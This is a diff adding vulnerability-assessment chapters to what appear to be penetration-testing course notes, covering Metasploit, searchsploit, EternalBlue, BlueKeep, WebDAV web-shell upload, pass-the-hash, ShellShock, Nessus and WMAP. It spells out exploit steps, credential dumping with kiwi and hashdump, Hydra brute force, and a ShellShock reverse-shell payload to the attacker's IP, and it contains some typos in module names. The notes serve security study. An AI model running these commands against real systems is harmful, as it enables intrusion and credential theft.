@@ -863,7 +863,7 @@ run  # Execute the anonymous login
 Please note that often this anonymous login doesn't work, but in certain cases it can find ftp servers that doesn't need credentials for login.
 
 
-### SMB Enumeration
+### SMB (Samba) Enumeration
 
 SMB (Server Message Block) is a network sharing protocol that allows file sharing between two computers on the same LAN or between some devices (for example a computer and a printer).
 <br>
@@ -1213,3 +1213,416 @@ use auxilary/scanner/smtp/smtp_enum  # Auxiliary module for smtp enumeration
 run  # Perform users enumeration by brute-force
 ```
 
+
+## Assessment Methodologies: Vulnerability Assessment
+
+In this chapter we will explore some Vulnerability Assessments.
+
+### Overview of Windows Vulnerabilities
+
+Windows OS is the most used Operating System, with over 70% share. There were (are?) critical vulnerabilities and thus it's a OS subject to attacks.
+<br>
+Sometimes, a new version of Windows tends to solve a vulnerability, but not every company is updated with new versions.
+<br>
+Windows OS is developed in C programming language. Also, Windows is not configured to be secure (you have to manually add configurations).
+<br>
+The most common vulnerabilities are:
+<li>Information Disclosure: allow attackers to gain access to sensitive data</li>
+<li>Buffer Overflow: caused by a programmin error, can allow attackers to write data into memory</li>
+<li>Remote Code Execution: can allow attackers to remotely execute code</li>
+<li>Privilegies Escalation: can allow attackers to elevate their privilegies</li>
+<li>Denial Of Service (DOS): can allow attackers to consume cpu/ram in order to reduce the functionalities of the main system</li>
+
+### Frequentely Exploited Windows Services
+
+Microsoft OS has some default services that can be configured to run on a host and some of them may have or had vulnerabilities.
+<br>
+![alt text](windows_services.jpg "Frequently Exploited Windows Services")
+
+### Vulnerability Scanning with MSF
+
+Vulnerability Scanning is the process of scan vulnerabilities of a target and try to see if those can be exploited.
+
+```bash
+# run postgresql and msfconsole and create a new workspace
+# search for the first port scan, set the target-ip and run it
+setg RHOSTS target-ip  # In Metasploit framework you can set a global variable that will use your target-ip as the RHOSTS for every module you use
+db_nmap -sS -sV -O target-ip  # Scan port, version and OS with Nmap script on Metasploit framework
+search type:exploit target-version  # Search for Auxiliary modules for the version of the target you found (example for the Http port)
+```
+
+You can type the info command to gain more insights on what a module does and for which versions.
+<br>
+If you don't find any exploit module specific for the version of your target you can try to search for other ports too (example Mysql port).
+
+```bash
+use exploit/multi/http/glassfish_deployer  # Example of an Exploit module that works on our target service on a target port
+set payload windows/meterpreter/reverse_tcp  # Set the payload to work for the target os (in this example Windows)
+show options  # And check for any missing field that you require and try to set it
+```
+
+### Kali Linux Searchsploit
+
+You can use a Kali Linux tool, called Searchsploit to find exploits for specific versions (that you may have failed to find with Metasploit framework).
+
+```bash
+searchsploit "target-os-version" | grep -e "Metasploit"  # Find only the modules that are available on Metasploit framework
+# return on msfconsole
+search exploit-name  # Search for the exploit that you have found with the searchsploit tool
+use auxiliary/scanner/smb/smb_ms17_010  # In this case we'll first use a module that tells if our target os version is vulnerabile to the exploit
+run  # This example module will tell if our target os version is vulnerabile to the exploit
+use exploit/windows/smb/ms017_010_eternalblue  # Use the Exploit module of our target os version
+run  # Run the exploit
+```
+
+After this, now you may have established a connection and you may see a meterpreter console.
+
+```bash
+sysinfo  # Gain information about the OS you are in
+# Now you can execute other commands
+```
+
+### Metasploit-Autopwn
+
+Github repo that executes a Metasploit script to tell you exploit modules for your target.
+
+```bash
+wget repo-link  # Download the repo (or with git)
+sudo mv db_autopwn.rb /usr/share/metasploit-framework/plugins  # Import this into Metasploit modules
+# return on msfconsole
+load db_autopwn  # Load the module
+db_autopwn -p -t -PI target-port  # Find Exploit modules for your target port
+```
+
+### Analyze msfconsole comand
+
+This command will analyze the hosts, services etc that you have saved on your Metasploit framework workspace.
+
+```bash
+analyze  # Analyze your Metasploit framework workspace
+vulns  # Now this Vulnerability page will be filled with more information on your vulnerabilities
+```
+
+### WebDav Vulnerabilities
+
+Microsoft IIS is a web server created by Windows. It provides a GUI for web applications. It can be used to host pages with asp.net and php.
+<br>
+WebDav is an extension of the http protocol. It is used to edit and manage files on a web server (like the IIS).
+<br>
+Both IIS and WebDav is usually on port 80 or 443.
+<br>
+You can authenticate with username and password.
+<br><br>
+Our goal here is to obtain the WebDav version (if it's used) and try to see if we can connect on it. Then we can insert a malicious payload in order to grant us the ability to execute commands on the server.
+
+#### Tools for WebDav Vulnerabilities
+
+<li>davtest: used to scan and find vulnerabilities on a WebDav server.</li>
+<li>cadaver: it supports file upload, download, editing, etc.</li>
+
+```bash
+nmap -sV -sC target-ip  # Perform a regular port scanning to detect WebDav ports (if any)
+nmap -sV -p 80 --script=http-enum target-ip  # We found that it is using WebDav, now we run this command to gain more info
+```
+
+We have seen that in the folder part of the output it tells us (Unauthorized). This means that the authentication method is on.
+<br>
+We can confirm it trying to access the folder on the web (example: http//target-ip/webdav/)
+<br>
+We can try to brute-force the credentials using Hydra tool.
+
+```bash
+# Use hydra to perform a brute-force using the common_users and common_passwords files on the folder you have found (usually /webdav/)
+hydra -L /usr/share/wordlists/metasploit/common_users.txt -P /usr/share/wordlists/metasploit/common_passwords.txt target-ip http-get /webdav/
+```
+
+After you have got the right credentials you can use them to log in the browser on that folder.
+<br>
+We can use Davtest tool to try to check what kind files or folders we can execute, upload, edit, ecc.
+
+```bash
+davtest -auth target-username:target-password -url http://target-ip/target-folder  # Use the credentials found and the target ip and the folder you have found (usually webdav)
+```
+
+Now we can use Cadaver to upload, execute, edit files.
+
+```bash
+cadaver http://target-ip/target-folder  # Use the target-ip and the folder you have found (usually webdav)
+# Write username and password
+# Write your commands!
+```
+
+Now you have the access on a shell!
+<br>
+But, to execute more advanced commands and specific files you can upload a web shell for a file type that you know you can execute on the webdav.
+
+```bash
+ls -al /usr/share/webshells  # Check the web shells available on Kali Linux and find the one with the file type that you can execute
+# Come back on cadaver
+put /usr/share/webshells/asp/webshell.asp  # Upload on the webdav a web shell specific (in this case .asp)
+```
+
+Now if you go to that folder in the browser you can see the folders that you have created with Davtest and you can find the web shell that you have just uploaded.
+<br>
+Now you can use the web-shell directly in the browser!
+
+
+### Vulnerability Analysis: EternalBlue
+
+EternalBlue is a collection of Windows vulnerabilities that allowed attacked to gain access to Windows systems.
+<br>
+The EternalBlue was developed by NSA but then a group of hackers leaked it and showed to the public.
+<br>
+Metasploit framework has some auxiliary modules that can see if the target is vulnerabile to EternalBlue and there are some exploit modules for attacking that vulnerability. But you can also exploit it manually without Metasploit.
+
+```bash
+sudo nmap -sV -p 445 -O target-ip  # Perform a port scan on 445 to check for version and os for SMB port
+sudo nmap -sV -p 445 --script=smb-vuln-ms17-010 target-ip  # Check if the target os is vulnerable to EternalBlue
+```
+
+#### Manual EternalBlue Exploit 
+
+We will use the AutoBlue-MS17-010 that you can find on GitHub.
+
+```bash
+# clone the repository from GitHub
+cd shellcode  # Change directory to shellcode
+chmod +x shell_prep.sh  # Change privilegies of that script
+./shell_prep.sh  # Execute the script
+y  # Confirm
+your-ip  # Write your ip
+# Write the two LPORT(s)
+# Type 0 or 1 
+# Type 0 or 1
+  nc -nvlp Lport  # in other terminal, write the port you have wrote for LPORT above to make it listen to that port
+cd ..
+chmod +x eternalblue_exploit7.py  # Specify the Windows version you need to use
+python eternalblue_exploit7.py target-ip shellcode/sc_x64.bin  # Specify the 32 or 64 version and the Windows version
+```
+
+After this, if the target is vulnerable, on the second console (with nc listening) you will have access to the Windows shell of the target.
+
+
+#### Metasploit EternalBlue Exploit
+
+```bash
+# run postgresql and msfconsole
+search eternalblue  # Search for eternalblue auxiliary and exploit modules
+# use the auxiliary module (setting the target-ip as RHOSTS) to check if the target is vulnerable, if so continue
+use exploit/windows/smb/ms17_010_eternalblue  # Use the exploit module
+show options  # Show options
+set RHOSTS target-ip  # Set the target ip
+exploit  # Run the exploit
+```
+
+After this, if the target is vulnerable, you will get a meterpreter shell where you can execute Windows commands on the target.
+
+### Vulnerability Analysis: BlueKeep
+
+BlueKeep is a RDP vulnerability where attacks can gain access to Windows system, by gaining access to a chunk of the kernel and executing arbitrary code into the target.
+<br>
+Please note that writing code into the kernel can make the system crash.
+
+```bash
+sudo nmap -p 3389 target-ip  # Perform a port scan on the target
+# run postgresql and msfconsole
+search BlueKeep  # Search for BlueKeep auxiliary and exploit modules
+# use the auxiliary module (setting the target-ip as RHOSTS) to check if the target is vulnerable, if so continue
+use exploit/windows/rdp/cve_2019_0708_bluekeep_rce  # Use the exploit module
+set RHOSTS target-ip  # Set the target-ip as RHOSTS
+show targets  # Check what Windows versions you can target
+set target number  # Set the number of your target
+# check/set the CHUNK size (too much high will cause the system to crash)
+exploit  # Run the exploit
+```
+
+After this, if the target is vulnerable, you will get a meterpreter shell where you can execute Windows commands on the target.
+
+
+### Pass-the-Hash Attacks
+
+Pass-the-hash attacks are a Windows vulnerability techniques to harvest NTLM hashes or clear-text passwords and using them to authenticate with the target legitimately.
+<br>
+You can use Metasploit PsExec module or Crackmapexec tool.
+
+```bash
+# run postgresql and msfconsole
+search BlueKeep  # Search for BlueKeep auxiliary and exploit modules
+# exploit a target and gain the meterpreter shell (like in the previous examples)
+pgrep lsass # In the target meterpreter shell, get the process ID
+migrate target-id  # Migrate to that ID
+getuid  # Get the name of the target system that you are using
+load kiwi  # Run Kiwi tool
+lsa_dump_sam  # Get the admin username and NLTM credentials (hash)
+# Copy the admin username and hash password (or of an user)
+hashdump  # Get also the LM hash password of the target(s)
+```
+
+After you have got the hashes you can run the Metasploit framework again
+
+```bash
+# run msfconsole again
+search psexec  # Search for PsExec exploit module
+use exploit/windows/smb/psexec  # Use the module
+sessions  # Get the port you're on
+show options  # Show options
+set LPORT number  # Set a different LPORT (different from the one you found in the sessions)
+set RHOSTS target-ip  # Set the RHOSTS with the target ip
+set SMBUser target-username  # Set the SMBUser with the target-username
+set SMBPass target-LMhash  # Set the SMBPass with the LM hash password of the target
+set target Native \upload  # Set the target shell (to get a Meterpreter shell)
+exploit  # Exploit the target
+```
+
+Now you have access to a Meterpreter shell with commands, and you'll be logged with clean credentials.
+
+
+#### Using Crackmapexec tool
+
+```bash
+crackmapexec smb target-ip -u target-username -H "target-NTLMhash" -x "command" 
+```
+
+With this command you can run the CrackmapExec tool for smb with the credentials and hash password you have got and the command you want to execute on the target.
+
+
+### Frequently Exploited Linux Services
+
+Linux is a free and open-source operating system that combines the Linux kernel and the GNU toolkit (a collection of utilities like cat, ls commands..).
+This combination makes Linux as a whole operating system.
+<br>
+It is often deployed as a server, thus it's common to find certain open ports on Linux systems.
+<br>
+There are many different Linux distros, that are variants of the operating system using different desktops.
+<br>
+![alt text](linux_services.jpg "Frequently Exploited Linux Services")
+
+
+### Exploiting Bash Vulnerability (ShellShock)
+
+This vulnerability allows the attacker to execute commands on the Linux target system.
+<br>
+This targets Apache and Bash.
+<br>
+This vulnerability uses the fact the not-patched Bash shells can execute code after these characters () {:;};.
+<br>
+This will also reflect on Apache servers because they use the CGI (Common Gateway Interface) that allows to execute commands on Linux os.
+<br>
+To exploit this vulnerability you can try to do it manually writing bash commands on the CGI interface, or you can use Metasploit exploit modules.
+
+```bash
+nmap -sV target-ip  # Use Nmap to get the version of and the system of the target ports
+# Open the browser, search the target-ip, read the source code and you can notice that Javascript code executes some .cgi commands on the bash, and you can access them (it's an example exercise)
+nmap -sV target-ip --script=http-shellshock --script-args "http-shellshock.uri=/target-cgi.cgi"  # Above you've got the .cgi script, now you can use Nmap to check if the target is vulnerable to shellshock
+# Open web applications analysis -> burpsuite from your Kali Linux
+# Click on "Proxy" and "Intercept is on" from the Burpsuit GUI
+# Click on "Intercept" from the Burpsuit GUI
+nc -nvlip 1234  # On your bash set Netcat to listen on a particular port to create a reverse shell with the target
+# Click on "Repeater" and replace the User-Agent with () { :; }; echo; echo; /bin/bash -c 'bash -i>&/dev/tcp/your-ip/1234 0>&1'  # Create a reverse shell
+# Click on "Send"
+```
+
+Now on your NetCat bash console you can execute commands directly on the target!
+
+#### Exploit ShellShock with Metasploit Framework
+
+```bash
+# start postgresql and msfconsole
+search shellshock  # Search for the Auxiliary module to see if the target is vulnerable
+# use the auxiliary/scanner/http/apache_mod_cgi_bash_env, set params and run it. If target is vulnerable continue
+use exploit/multi/http/cups_bash_env_exec  # Use the Exploit module for ShellShock
+set RHOSTS target-ip  # Set the target-ip
+set TARGETURI target-cgi.cgi  # Set the target cgi that you have found in the previous method
+exploit  # Run the exploit
+```
+
+Now you have access to a Meterpreter shell and you can execute commands on the bash shell!
+<br>
+*Please note that in reality this exploit module seems to have changed*
+
+
+### Vulnerability Scanning with Nessus
+
+Nessus is a tool for vulnerability scanning.
+<br>
+It automates the process of searching for vulnerabilities and it will give us detailed information.
+<br>
+It will perform:
+<li>Host discovery</li>
+<li>Port scanning</li>
+<li>Checks if the services on the target are in the list of vulnerabilities</li>
+<br>
+Nessus has a free version and a paid one, we can go to its website and download the free version (Nessus Essentials).
+
+```bash
+# download the free version of Nessus and install it in your shell (chmod +x filename and sudo dpkg -i filename)
+sudo systemctl start nessusd.service  # Start Nessus
+# Open browser and go to http://your-local-ip:8834 
+# Use the activation code you received and create a Nessus account
+# After the whole process of initialization, click on New Scan
+# Click on Basic Network Scan 
+# Write name and target-ip(s)
+# Click on Launch
+# After the process check on the Vulnerabilities it found
+```
+
+You can see every vulnerability it found, with the host, service and the risk factor of each one.
+
+#### Import Nessus results into Metasploit framework
+
+```bash
+# In the Nessus tool click on Export.
+# run postgresql and msfconsole and create a new workspace
+db_import path-of-nessus-file  # Import the export of Nessus into Metasploit framework
+```
+
+Now you can type commands like hosts, services to check all the results.
+<br>
+You can type vulns to check all the vulnerabilities that Nessus has found.
+
+```bash
+vulns -p target-port  # On msfconsole, after you import the Nessus file you can check for vulnerabilities on a certain port that you want to target
+```
+
+You can also search for a particular CVE and search for exploits of that vulnerability.
+
+```bash
+search cve:target-cve name:target-name  # Search for a particular cve and target name
+```
+
+Now you can use an Exploit module, configure it and make exploits of your target's vulnerabilities!
+
+
+### Web App Vulnerability Scanning with WMAP
+
+Wmap is a web-application for vulnerability scanning and can automate web server enumeration.
+<br>
+Wmap is fully integrated with Metasploit framework.
+
+```bash
+# start postgresql, msfconsole and create a new workspace
+setg RHOSTS target-ip  # Set the global variable with the target ip
+load wmap  # Load Wmap inside Metasploit framework
+wmap_  # List every Wmap commands
+wmap_sites -a target-ip  # Add the target-ip to use
+wmap_targets -t http://target-ip  # Add the target url 
+# You can check what you have enumerated so far typing the command -l (example wmap_sites -l)
+wmap_run -t  # Run Wmap e get all the auxiliary modules available for your target (it searches automatically)
+wmap_run -e  # Executes all the auxiliary modules that it has found
+wmap_vulns -l  # Show every vulnerability that it has found
+```
+
+Now you have a list of vulnerabilities found and you can perform more vulnerability checking or exploits.
+<br>
+In the course example we are going to use some:
+
+```bash
+use auxiliary/scanner/http/http_put  # Use the Auxiliary module to scan the http port with put or delete methods
+set PATH /data/  # Set the /data url (that we found in the robots.txt)
+run  # Execute the module: if successful you'll be able to upload a file to the target server
+# Usually attackers upload payloads to create reverse shell with the target server
+set FILEDATA "Example text"  # Create a text for the file you'll upload
+set FILENAME "example.txt"  # Create the name of your text file to upload
+run  # Try to upload the file to the server
+curl http://target-ip/data/example.txt  # Show the file you have uploaded
+```
